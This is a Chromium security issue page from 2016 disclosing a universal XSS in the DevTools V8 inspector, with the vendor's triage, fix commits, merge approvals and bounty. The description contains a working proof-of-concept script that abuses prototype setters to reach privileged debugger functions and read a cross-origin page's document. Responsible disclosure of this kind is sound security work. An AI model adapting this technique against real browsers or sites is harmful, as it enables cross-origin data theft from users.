# Security: Universal XSS using DevTools

| Field | Value |
|-------|-------|
| **Issue ID** | [40085092](https://issues.chromium.org/issues/40085092) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Platform>DevTools |
| **Reporter** | se...@gmail.com |
| **Assignee** | dg...@chromium.org |
| **Created** | 2016-08-14 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

src/third\_party/WebKit/Source/platform/v8\_inspector/V8InjectedScriptHost.cpp:20:  

void setFunctionProperty(v8::Local[v8::Context](javascript:void(0);) context, v8::Local[v8::Object](javascript:void(0);) obj, const char\* name, v8::FunctionCallback callback, v8::Local[v8::External](javascript:void(0);) external)  

{  

v8::Local[v8::String](javascript:void(0);) funcName = toV8StringInternalized(context->GetIsolate(), name);  

v8::Local[v8::Function](javascript:void(0);) func;  

if (!v8::Function::New(context, callback, external, 0, v8::ConstructorBehavior::kThrow).ToLocal(&func))  

return;  

func->SetName(funcName);  

if (!obj->Set(context, funcName, func).FromMaybe(false))  

return;  

}

src/third\_party/WebKit/Source/platform/v8\_inspector/V8Debugger.cpp:648:  

v8::Local[v8::Value](javascript:void(0);) V8Debugger::collectionEntries(v8::Local[v8::Context](javascript:void(0);) context, v8::Local[v8::Object](javascript:void(0);) object)  

{  

if (!enabled()) {  

NOTREACHED();  

return v8::Undefined(m\_isolate);  

}  

v8::Local[v8::Value](javascript:void(0);) argv[] = { object };  

v8::Local[v8::Value](javascript:void(0);) entriesValue = callDebuggerMethod("getCollectionEntries", 1, argv).ToLocalChecked();  

if (!entriesValue->IsArray())  

return v8::Undefined(m\_isolate);  

v8::Local[v8::Array](javascript:void(0);) entries = entriesValue.As[v8::Array](javascript:void(0);)();  

if (!markArrayEntriesAsInternal(context, entries, V8InternalValueType::kEntry))  

return v8::Undefined(m\_isolate);  

if (!entries->SetPrototype(context, v8::Null(m\_isolate)).FromMaybe(false))  

return v8::Undefined(m\_isolate);  

return entries;  

}

|setFunctionProperty()| exposes |InjectedScriptHost|'s methods to setters defined on |Object.prototype|.  

|V8Debugger::collectionEntries()|, which is called by |InjectedScriptHost.getInternalProperties()|,  

makes the |entries| array inherit from the null prototype, but it doesn't do the same to the elements of  

the array, thus |getInternalProperties()| can be used to leak |Object.prototype| of the v8 debug context.  

That context contains a lot of privileged functions, the repro calls one of them, namely  

|ObjectMirror.prototype.property()|, to obtain the "document" property of a cross-origin window.

**VERSION**  

Google Chrome 52.0.2743.116 (Official Build) m (64-bit)  

Google Chrome 54.0.2828.0 (Official Build) canary (64-bit)

**REPRODUCTION CASE**

<script>
frame = document.documentElement.appendChild(document.createElement("iframe"));
frame.src = "https://www.google.com/intl/ru/ads/";
frame.onload = () => {
//"collectionEntries" is added to support the stable branch of chrome
["collectionEntries", "getInternalProperties"].map(methodName => Object.prototype.\_\_defineSetter\_\_(methodName, getProps => {
setTimeout(() => {
props = getProps(new Set([1]));
entry = props[1] ? props[1][0] : props[0];
debugObjectProto = entry.\_\_proto\_\_;
debugObjectProto.\_\_defineSetter\_\_("resolved\_", function () {
delete debugObjectProto.resolved\_;
targetDocument = this.property.call({value\_: frame.contentWindow}, "document").value\_;
anchor = targetDocument.createElement("a");
anchor.href = "javascript:alert(location)";
anchor.click();
});
getProps(x => x);
});
}));
console.dir(document);
}
</script>
<h1>This repro only works when the DevTools is opened.</h1>

--

I would like to remain anonymous for this report.

## Timeline

### oc...@chromium.org (2016-08-15)

Thanks for another great report. dgozman, could you please take a look, or assign it to the right person? 

Medium for the devtools being open requirement.

[Monorail components: Platform>DevTools]

### sh...@chromium.org (2016-08-16)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-08-16)

[Empty comment from Monorail migration]

### dg...@chromium.org (2016-08-16)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-08-17)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/93bc623489bdcfc7e9127614fcfb3258edf3f0f9

commit 93bc623489bdcfc7e9127614fcfb3258edf3f0f9
Author: dgozman <dgozman@chromium.org>
Date: Wed Aug 17 03:02:52 2016

[DevTools] Copy objects from debugger context to inspected context properly.

BUG=637594

Review-Url: https://codereview.chromium.org/2253643002
Cr-Commit-Position: refs/heads/master@{#412436}

[modify] https://crrev.com/93bc623489bdcfc7e9127614fcfb3258edf3f0f9/third_party/WebKit/Source/platform/blink_platform.gypi
[modify] https://crrev.com/93bc623489bdcfc7e9127614fcfb3258edf3f0f9/third_party/WebKit/Source/platform/v8_inspector/V8Console.cpp
[modify] https://crrev.com/93bc623489bdcfc7e9127614fcfb3258edf3f0f9/third_party/WebKit/Source/platform/v8_inspector/V8Debugger.cpp
[modify] https://crrev.com/93bc623489bdcfc7e9127614fcfb3258edf3f0f9/third_party/WebKit/Source/platform/v8_inspector/V8Debugger.h
[modify] https://crrev.com/93bc623489bdcfc7e9127614fcfb3258edf3f0f9/third_party/WebKit/Source/platform/v8_inspector/V8InjectedScriptHost.cpp
[add] https://crrev.com/93bc623489bdcfc7e9127614fcfb3258edf3f0f9/third_party/WebKit/Source/platform/v8_inspector/V8ValueCopier.cpp
[add] https://crrev.com/93bc623489bdcfc7e9127614fcfb3258edf3f0f9/third_party/WebKit/Source/platform/v8_inspector/V8ValueCopier.h
[modify] https://crrev.com/93bc623489bdcfc7e9127614fcfb3258edf3f0f9/third_party/WebKit/Source/platform/v8_inspector/v8_inspector.gyp


### dg...@chromium.org (2016-08-23)

Requesting merge of https://chromium.googlesource.com/chromium/src.git/+/93bc623489bdcfc7e9127614fcfb3258edf3f0f9 to M53.

### di...@chromium.org (2016-08-23)

[Automated comment] Less than 2 weeks to go before stable on M53, manual review required.

### go...@chromium.org (2016-08-23)

+ awhalley@, can we take this merge in for M53?

### aw...@chromium.org (2016-08-23)

Yep, good for M53.

### go...@chromium.org (2016-08-23)

Approving merge to M53 branch 2785 based on https://crbug.com/chromium/637594#c9. Please merge ASAP (if merge happens before 5:00 PM PT today, we can take it for tomorrow's beta release). Thank you.

### sh...@chromium.org (2016-08-24)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges. This update is based on the merge- labels applied to this issue. Please reopen if this update was incorrect.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2016-08-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-08-25)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-08-26)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/339d406b19cd73d8a308150c4f36e6ec1fee65fd

commit 339d406b19cd73d8a308150c4f36e6ec1fee65fd
Author: Alexey Kozyatinskiy <kozyatinskiy@chromium.org>
Date: Fri Aug 26 22:16:39 2016

[DevTools] Copy objects from debugger context to inspected context properly.

BUG=637594

Review-Url: https://codereview.chromium.org/2253643002
Cr-Commit-Position: refs/heads/master@{#412436}
(cherry picked from commit 93bc623489bdcfc7e9127614fcfb3258edf3f0f9)
TBR=dgozman@chromium.org

Review URL: https://codereview.chromium.org/2284873002 .

Cr-Commit-Position: refs/branch-heads/2785@{#768}
Cr-Branched-From: 68623971be0cfc492a2cb0427d7f478e7b214c24-refs/heads/master@{#403382}

[modify] https://crrev.com/339d406b19cd73d8a308150c4f36e6ec1fee65fd/third_party/WebKit/Source/platform/blink_platform.gypi
[modify] https://crrev.com/339d406b19cd73d8a308150c4f36e6ec1fee65fd/third_party/WebKit/Source/platform/v8_inspector/V8Console.cpp
[modify] https://crrev.com/339d406b19cd73d8a308150c4f36e6ec1fee65fd/third_party/WebKit/Source/platform/v8_inspector/V8DebuggerAgentImpl.cpp
[modify] https://crrev.com/339d406b19cd73d8a308150c4f36e6ec1fee65fd/third_party/WebKit/Source/platform/v8_inspector/V8DebuggerImpl.cpp
[modify] https://crrev.com/339d406b19cd73d8a308150c4f36e6ec1fee65fd/third_party/WebKit/Source/platform/v8_inspector/V8DebuggerImpl.h
[modify] https://crrev.com/339d406b19cd73d8a308150c4f36e6ec1fee65fd/third_party/WebKit/Source/platform/v8_inspector/V8InjectedScriptHost.cpp
[add] https://crrev.com/339d406b19cd73d8a308150c4f36e6ec1fee65fd/third_party/WebKit/Source/platform/v8_inspector/V8ValueCopier.cpp
[add] https://crrev.com/339d406b19cd73d8a308150c4f36e6ec1fee65fd/third_party/WebKit/Source/platform/v8_inspector/V8ValueCopier.h
[modify] https://crrev.com/339d406b19cd73d8a308150c4f36e6ec1fee65fd/third_party/WebKit/Source/platform/v8_inspector/v8_inspector.gyp
[add] https://crrev.com/339d406b19cd73d8a308150c4f36e6ec1fee65fd/third_party/cld_3/src
[add] https://crrev.com/339d406b19cd73d8a308150c4f36e6ec1fee65fd/third_party/visualmetrics/src


### aw...@chromium.org (2016-08-29)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-08-30)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-08-30)

Thanks as ever!

### aw...@chromium.org (2016-09-01)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-09-14)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-09-28)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-11-30)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-02-21)

[Empty comment from Monorail migration]

### is...@google.com (2019-02-21)

This issue was migrated from crbug.com/chromium/637594?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40085092)*
